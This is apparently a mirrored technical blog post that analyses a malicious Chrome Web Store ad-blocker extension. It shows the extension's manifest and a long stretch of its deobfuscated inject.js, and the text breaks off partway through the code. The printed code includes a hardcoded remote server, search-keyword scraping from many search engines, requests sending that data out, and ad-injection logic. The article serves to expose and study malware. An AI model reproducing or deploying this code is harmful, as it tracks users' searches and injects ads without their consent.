<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Overview of malicious browser extensions</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The article provides an example of parsing a malicious browser extension from the Chrome Web Store - ‚ÄúRemove Ads (HET Ads)‚Äù. 

 Expansion Information ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Overview of malicious browser extensions</h1><div class="post__text post__text-html js-mediator-article"><div style="text-align:center;"><img src="https://habrastorage.org/files/084/47d/876/08447d87696a4eb780fff31b557a2cd8.png"></div><br><br>  The article provides an example of parsing a malicious browser extension from the Chrome Web Store - ‚ÄúRemove Ads (HET Ads)‚Äù. <br><a name="habracut"></a><br><h3>  Expansion Information </h3><br>  Distribution Method: <a href="https://chrome.google.com/webstore/detail/%25D1%2583%25D0%25B1%25D1%2580%25D0%25B0%25D1%2582%25D1%258C-%25D1%2580%25D0%25B5%25D0%25BA%25D0%25BB%25D0%25B0%25D0%25BC%25D1%2583-het-%25D1%2580%25D0%25B5%25D0%25BA%25D0%25BB%25D0%25B0%25D0%25BC/eaikmbeeklemcgemabilgpjkanodfmic">Chrome Store</a> <br>  Title: "Remove Ads (HET Advertising)" <br>  ID: eaikmbeeklemcgemabilgpjkanodfmic <br>  Last update (at the time of writing): 10 April 2015 <br>  Expansion Version: 5.8 <br>  Number of users per week: 57,000 <br><br><div class="spoiler">  <b class="spoiler_title">Expansion Description:</b> <div class="spoiler_text">  Advertising Blocker: Blocks annoying ads on VKontakte and Odnoklassniki, Ads on YouTube, Banners, Pop-ups, etc. <br>  HET Advertising for Google Chrome blocks: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      ¬∑ Advertising VKontakte and Odnoklassniki <br>  ¬∑ Banners on all sites <br>  ¬∑ Video advertising on Youtube <br>  ¬∑ Pop-ups on all sites <br>  ¬∑ Any distracting and annoying ads <br><br>  A unique self-learning algorithm! <br>  Make your browser a machine for processing and eliminating advertising! <br></div></div><br><h3>  Introduction </h3><br>  Reasons to publish a review of this particular extension: <br>  - first, it is located in the Chrome Store and this is an indication that the store successfully has malicious extensions; <br>  - secondly, the extension has a considerable audience, which may not even know that they have this extension; <br>  - thirdly, the harmfulness of this expansion is not particularly covered, and therefore the material may be available to a wider audience. <br><br><h3>  Expansion Overview </h3><br>  To make a review you need to get the extension code. <br>  To do this, install it from the Chrome Store and find the source files for the extension in the appropriate folder of the Chrome browser. <br><br>  In my case, this is the folder: <br><br><pre> % appdata% \ Google \ Chrome \ User Data \ Default \ Extensions \ eaikmbeeklemcgemabilgpjkanodfmic
</pre><br>  File structure in this folder: <br><br><pre> |  extension
 | - 16.png
 | - 48.png
 | - 128.png
 | - detector.js
 | - inject.js
 | - jquery-2.1.1.min.js
 | - manifest.json
 | - md5.js
</pre><br><h3>  Remark 1 </h3><br>  Extensions of this kind cannot engage in brilliant work with the DOM and do not require cross-browser compatibility.  Therefore, at best, you may need 5 functions from jquery, which apparently were hard to write, so we decided to take the library. <br><br>  We go further. <br><br>  Any extension for chromium browsers begins its path with the file manifest.json. <br>  Open it: <br><br><div class="spoiler">  <b class="spoiler_title">manifest.json</b> <div class="spoiler_text"><pre><code class="hljs json">{ <span class="hljs-attr"><span class="hljs-attr">"content_scripts"</span></span>: [ { <span class="hljs-attr"><span class="hljs-attr">"js"</span></span>: [ <span class="hljs-string"><span class="hljs-string">"md5.js"</span></span>, <span class="hljs-string"><span class="hljs-string">"detector.js"</span></span>, <span class="hljs-string"><span class="hljs-string">"jquery-2.1.1.min.js"</span></span>, <span class="hljs-string"><span class="hljs-string">"inject.js"</span></span> ], <span class="hljs-attr"><span class="hljs-attr">"matches"</span></span>: [ <span class="hljs-string"><span class="hljs-string">"http://*/*"</span></span>, <span class="hljs-string"><span class="hljs-string">"https://*/*"</span></span> ], <span class="hljs-attr"><span class="hljs-attr">"run_at"</span></span>: <span class="hljs-string"><span class="hljs-string">"document_start"</span></span> } ], <span class="hljs-attr"><span class="hljs-attr">"description"</span></span>: <span class="hljs-string"><span class="hljs-string">"..."</span></span>, <span class="hljs-attr"><span class="hljs-attr">"icons"</span></span>: { <span class="hljs-attr"><span class="hljs-attr">"128"</span></span>: <span class="hljs-string"><span class="hljs-string">"128.png"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"16"</span></span>: <span class="hljs-string"><span class="hljs-string">"16.png"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"48"</span></span>: <span class="hljs-string"><span class="hljs-string">"48.png"</span></span> }, <span class="hljs-attr"><span class="hljs-attr">"manifest_version"</span></span>: <span class="hljs-number"><span class="hljs-number">2</span></span>, <span class="hljs-attr"><span class="hljs-attr">"name"</span></span>: <span class="hljs-string"><span class="hljs-string">"  (HET )"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"update_url"</span></span>: <span class="hljs-string"><span class="hljs-string">"https://clients2.google.com/service/update2/crx"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"version"</span></span>: <span class="hljs-string"><span class="hljs-string">"5.8"</span></span> }</code> </pre> <br></div></div><br><h3>  Remark 2 </h3><br>  The extension injects <u>all</u> its scripts into <u>every</u> page you open.  This is bad both in terms of security and in terms of performance. <br><br>  So, on each page we have the following js-files: <br><br><pre> - md5.js
 - detector.js
 - jquery-2.1.1.min.js
 - inject.js
</pre><br><br>  In my opinion, the most suspicious file of the name is inject.js.  Therefore, we start with it, and if you need it, take a look at the rest. <br>  The file is obfuscated, if you can call it that.  I will give the first characters, and you guess what it is obfustsirovan: <br><br><pre> <code class="javascript hljs"><span class="hljs-built_in"><span class="hljs-built_in">eval</span></span>(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">p,a,c,k,e,d</span></span></span><span class="hljs-function">)</span></span>{...</code> </pre><br><br>  Those who met with obfuscation, now disappointed sigh ‚ÄúHow trite.  Something like <a href="http://dean.edwards.name/packer/">that</a> . ‚Äù  I usually recall the following quotation from the movie Big Snatch (Snatch): <br><br><blockquote>  - ***** - bang, hold me tight!  What is this? <br>  - This is my belt. <br>  - No, Tommy, you have a gun in your pants.  What makes the gun in your pants? <br>  - This is for protection. <br>  - To protect from whom?  From the Nazis or what?  You are not afraid to shoot yourself eggs when you sit down? <br></blockquote><br><br>  We deconstruct this code with the help of the excellent <a href="http://jsbeautifier.org/">JSBeautifier</a> service.  We have: <br><br><div class="spoiler">  <b class="spoiler_title">inject.js</b> <div class="spoiler_text"><pre> <code class="javascript hljs">(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> host = <span class="hljs-string"><span class="hljs-string">'http://5.61.39.110/'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> aid = <span class="hljs-string"><span class="hljs-string">'49207271-5844-11e4-a8cb-a0b3cce611e4'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ttl = <span class="hljs-number"><span class="hljs-number">350</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> MAX_TTL = <span class="hljs-number"><span class="hljs-number">3600</span></span>; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getRandomInt</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">min, max</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.floor(<span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.random() * (max - min + <span class="hljs-number"><span class="hljs-number">1</span></span>)) + min } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ss</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">str</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (str + <span class="hljs-string"><span class="hljs-string">''</span></span>) .replace(<span class="hljs-regexp"><span class="hljs-regexp">/\\(.?)/g</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">s, n1</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">switch</span></span> (n1) { <span class="hljs-keyword"><span class="hljs-keyword">case</span></span> <span class="hljs-string"><span class="hljs-string">'\\'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">'\\'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">case</span></span> <span class="hljs-string"><span class="hljs-string">'0'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">'\u0000'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">case</span></span> <span class="hljs-string"><span class="hljs-string">''</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">''</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">default</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n1 } }) } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getKeyword</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ses = [ [<span class="hljs-regexp"><span class="hljs-regexp">/google\./i</span></span>, /(\?|&amp;)q=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/search\.yahoo\./i</span></span>, /(\?|&amp;)p=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/bing\.com/i</span></span>, /(\?|&amp;)q=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/search\.aol\./i</span></span>, /(\?|&amp;)q=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/ask\.com/i</span></span>, /(\?|&amp;)q=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/altavista\./i</span></span>, /(\?|&amp;)q=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/search\.lycos\./i</span></span>, /(\?|&amp;)query=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/alltheweb\./i</span></span>, /(\?|&amp;)q=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/yandex\./i</span></span>, /(\?|&amp;)text=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/(nova\.|search\.)?rambler\./i</span></span>, /(\?|&amp;)query=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/gogo\./i</span></span>, /(\?|&amp;)q=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/go\.mail\./i</span></span>, /(\?|&amp;)q=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>], [<span class="hljs-regexp"><span class="hljs-regexp">/nigma\./i</span></span>, /(\?|&amp;)s=(.*?)(&amp;|$)/i, <span class="hljs-number"><span class="hljs-number">2</span></span>] ]; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> q = <span class="hljs-literal"><span class="hljs-literal">null</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ref = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.location.href; <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; ses.length; i++) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> se = ses[i]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (ref.match(se[<span class="hljs-number"><span class="hljs-number">0</span></span>])) { q = ref.match(se[<span class="hljs-number"><span class="hljs-number">1</span></span>])[se[<span class="hljs-number"><span class="hljs-number">2</span></span>]]; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span> } } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> q } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> } } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getDomain</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">data</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> a = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">'a'</span></span>); a.href = data; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> a.hostname } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">url</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> getDomain(<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.location.href) } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">strips</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">str</span></span></span><span class="hljs-function">) </span></span>{ str = str.replace(<span class="hljs-regexp"><span class="hljs-regexp">/(?:\\[rn]|[\r\n]+)+/g</span></span>, <span class="hljs-string"><span class="hljs-string">""</span></span>); str = str.replace(<span class="hljs-regexp"><span class="hljs-regexp">/\s+/g</span></span>, <span class="hljs-string"><span class="hljs-string">""</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> str } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">isHtml5StorageSupported</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">'localStorage'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> <span class="hljs-built_in"><span class="hljs-built_in">window</span></span> &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>[<span class="hljs-string"><span class="hljs-string">'localStorage'</span></span>] !== <span class="hljs-literal"><span class="hljs-literal">null</span></span> } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-literal"><span class="hljs-literal">false</span></span> } } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getCountry</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (isHtml5StorageSupported()) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> localStorage.getItem(<span class="hljs-string"><span class="hljs-string">'country'</span></span>) } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-literal"><span class="hljs-literal">null</span></span> } } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getData</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (isHtml5StorageSupported()) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(localStorage.getItem(<span class="hljs-string"><span class="hljs-string">'data'</span></span>)) } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-literal"><span class="hljs-literal">null</span></span> } } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">setData</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">value</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (isHtml5StorageSupported()) { localStorage.setItem(<span class="hljs-string"><span class="hljs-string">'data'</span></span>, value) } } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getRequestInterval</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> retVal = <span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.round(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Date</span></span>() .getTime() / <span class="hljs-number"><span class="hljs-number">1000</span></span> / <span class="hljs-number"><span class="hljs-number">60</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (isHtml5StorageSupported()) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> value = localStorage.getItem(<span class="hljs-string"><span class="hljs-string">'xdata_ttl'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (value == <span class="hljs-literal"><span class="hljs-literal">null</span></span>) { localStorage.setItem(<span class="hljs-string"><span class="hljs-string">'xdata_ttl'</span></span>, retVal) } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { retVal = value * <span class="hljs-number"><span class="hljs-number">1</span></span> } } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> retVal } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">resetTTL</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (isHtml5StorageSupported()) { localStorage.setItem(<span class="hljs-string"><span class="hljs-string">'xttl'</span></span>, ttl) } } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getTTL</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> retVal = ttl; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (isHtml5StorageSupported()) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> value = localStorage.getItem(<span class="hljs-string"><span class="hljs-string">'xttl'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (value != <span class="hljs-literal"><span class="hljs-literal">null</span></span>) { retVal = value * <span class="hljs-number"><span class="hljs-number">1</span></span> } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { localStorage.setItem(<span class="hljs-string"><span class="hljs-string">'xttl'</span></span>, retVal) } } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> retVal } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">incrementTTL</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> retVal = ttl; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (isHtml5StorageSupported()) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> value = localStorage.getItem(<span class="hljs-string"><span class="hljs-string">'xttl'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (value == <span class="hljs-literal"><span class="hljs-literal">null</span></span>) { localStorage.setItem(<span class="hljs-string"><span class="hljs-string">'xttl'</span></span>, retVal) } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { value = value * <span class="hljs-number"><span class="hljs-number">1</span></span>; retVal = value + ttl; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (retVal &gt;= MAX_TTL) { retVal = ttl } localStorage.setItem(<span class="hljs-string"><span class="hljs-string">'xttl'</span></span>, retVal) } } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> retVal } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">isUpdateTime</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> currentTime = <span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.round(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Date</span></span>() .getTime() / <span class="hljs-number"><span class="hljs-number">1000</span></span> / <span class="hljs-number"><span class="hljs-number">60</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ttlOrigin = localStorage.getItem(<span class="hljs-string"><span class="hljs-string">'xttl'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ownTTL = getTTL(); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> result = (currentTime - getRequestInterval() &gt;= ownTTL); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (result) { localStorage.setItem(<span class="hljs-string"><span class="hljs-string">'xdata_ttl'</span></span>, currentTime) } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (ttlOrigin == <span class="hljs-literal"><span class="hljs-literal">null</span></span>) { result = <span class="hljs-literal"><span class="hljs-literal">true</span></span> } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> result } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">shuffle</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">o</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> j, x, i = o.length; i; j = <span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.floor(<span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.random() * i), x = o[--i], o[i] = o[j], o[j] = x) {}; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> o }; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">fisherYates</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">myArray</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = myArray.length; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (i == <span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-literal"><span class="hljs-literal">false</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (--i) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> j = <span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.floor(<span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.random() * (i + <span class="hljs-number"><span class="hljs-number">1</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> tempi = myArray[i]; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> tempj = myArray[j]; myArray[i] = tempj; myArray[j] = tempi } } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">updateKeyword</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> key = getKeyword(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (key == <span class="hljs-literal"><span class="hljs-literal">undefined</span></span> || key.length == <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> } $.get(host + <span class="hljs-string"><span class="hljs-string">'get_content.php'</span></span>, { <span class="hljs-string"><span class="hljs-string">'action'</span></span>: <span class="hljs-string"><span class="hljs-string">'add_keyword'</span></span>, <span class="hljs-string"><span class="hljs-string">'aid'</span></span>: aid, <span class="hljs-string"><span class="hljs-string">'guid'</span></span>: guid, <span class="hljs-string"><span class="hljs-string">'url'</span></span>: url(), <span class="hljs-string"><span class="hljs-string">'key'</span></span>: getKeyword() }) } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">injectArrayOfAds</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">advs</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span 